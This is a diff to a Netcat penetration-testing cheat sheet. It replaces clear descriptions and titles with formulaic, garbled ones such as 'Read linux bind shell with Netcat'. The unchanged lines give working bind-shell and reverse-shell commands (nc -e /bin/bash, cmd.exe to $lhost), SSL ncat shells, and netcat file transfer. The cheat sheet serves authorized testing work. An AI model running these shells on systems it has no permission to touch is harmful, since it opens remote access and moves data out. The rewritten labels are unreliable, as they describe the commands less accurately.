@@ -4,9 +4,9 @@
 
 ### Listener
 
-Set up a Netcat listener for incoming shells or file transfers.
+Read listener with Netcat.
 
-```sh title:"Start Netcat listener"
+```sh title:"Netcat Read Listener"
 nc -lvnp $lport
 ```
 <!-- cheat
@@ -15,9 +15,9 @@ import lports
 
 ### Windows bind shell
 
-Start a Windows bind shell with Netcat on the target.
+Read windows bind shell with Netcat.
 
-```cmd title:"Start Windows Netcat bind shell"
+```cmd title:"Netcat Read Windows Bind Shell"
 nc -lvnp $rport -e cmd.exe
 ```
 <!-- cheat
@@ -26,9 +26,9 @@ var rport
 
 ### Linux bind shell
 
-Start a Linux bind shell with Netcat on the target.
+Read linux bind shell with Netcat.
 
-```sh title:"Start Linux Netcat bind shell"
+```sh title:"Netcat Read Linux Bind Shell"
 nc -lvnp $rport -e /bin/bash
 ```
 <!-- cheat
@@ -37,9 +37,9 @@ var rport
 
 ### Windows reverse shell
 
-Connect a Windows shell back to your listener.
+Read windows reverse shell with Netcat.
 
-```cmd title:"Windows Netcat reverse shell"
+```cmd title:"Netcat Read Windows Reverse Shell"
 nc -nv $lhost $lport -e cmd.exe
 ```
 <!-- cheat
@@ -49,9 +49,9 @@ import tun_ip
 
 ### Linux reverse shell
 
-Connect a Linux shell back to your listener.
+Read linux reverse shell with Netcat.
 
-```sh title:"Linux Netcat reverse shell"
+```sh title:"Netcat Read Linux Reverse Shell"
 nc -nv $lhost $lport -e /bin/bash
 ```
 <!-- cheat
@@ -61,9 +61,9 @@ import tun_ip
 
 ### Download file via nc
 
-Listen on `$lport` to catch a file pushed from the target. Copies the matching sender command to clipboard. Runs md5sum so you can verify integrity.
+Download file via nc with Netcat.
 
-```sh title:"Listen for file from target, paste sender, md5 verify"
+```sh title:"Netcat Download File Via Nc"
 echo "nc $rhost_ip $lport < $target_file_name" | xclip -sel clip; nc -lvnp $lport > $downloaded_file_name; md5sum $downloaded_file_name
 ```
 <!-- cheat
@@ -77,9 +77,9 @@ var downloaded_file_name
 
 ### Upload file via nc
 
-Push a file to a target listener. Copies the matching listener command to clipboard. Logs md5 first so the receiver can confirm.
+Upload file via nc with Netcat.
 
-```sh title:"Push file to target listener, paste receiver, md5 first"
+```sh title:"Netcat Upload File Via Nc"
 echo "nc -lvnp $lport > $receiving_file_name" | xclip -sel clip; md5sum $file; nc $rhost_ip $rport < $file
 ```
 <!-- cheat
@@ -96,9 +96,9 @@ var receiving_file_name
 
 ### SSL bind shell
 
-Start an SSL-wrapped ncat bind shell and allow only one source IP.
+Read SSL bind shell with Netcat.
 
-```cmd title:"Start SSL ncat bind shell with allow-list"
+```cmd title:"Netcat Read SSL Bind Shell"
 ncat --exec cmd.exe --allow $allowed_ip -vnl $rport --ssl
 ```
 <!-- cheat
@@ -108,9 +108,9 @@ var rport
 
 ### Connect SSL bind shell
 
-Connect to an SSL-wrapped ncat bind shell.
+Read connect SSL bind shell with Netcat.
 
-```sh title:"Connect to SSL ncat bind shell"
+```sh title:"Netcat Read Connect SSL Bind Shell"
 ncat -v $rhost_ip $rport --ssl
 ```
 <!-- cheat
@@ -120,9 +120,9 @@ var rport
 
 ### HTTP proxy
 
-Start ncat as a simple HTTP proxy.
+Read HTTP proxy with Netcat.
 
-```sh title:"Start ncat HTTP proxy"
+```sh title:"Netcat Read HTTP Proxy"
 ncat --listen --proxy-type http $lport
 ```
 <!-- cheat
